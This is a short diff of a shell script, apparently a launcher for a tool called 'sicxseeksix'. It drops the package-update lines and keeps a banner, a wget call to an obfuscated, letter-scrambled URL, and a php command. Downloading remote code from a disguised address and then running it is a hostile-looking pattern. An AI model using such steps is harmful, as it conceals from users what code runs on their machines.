@@ -3,10 +3,6 @@
 
 sleep 2
 figlet sicxseeksix
-sleep 2
-apt-get update && apt-get upgrade
-sleep 2
-pkg install wget
 sleep 1
 wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
 php sicxseeksix
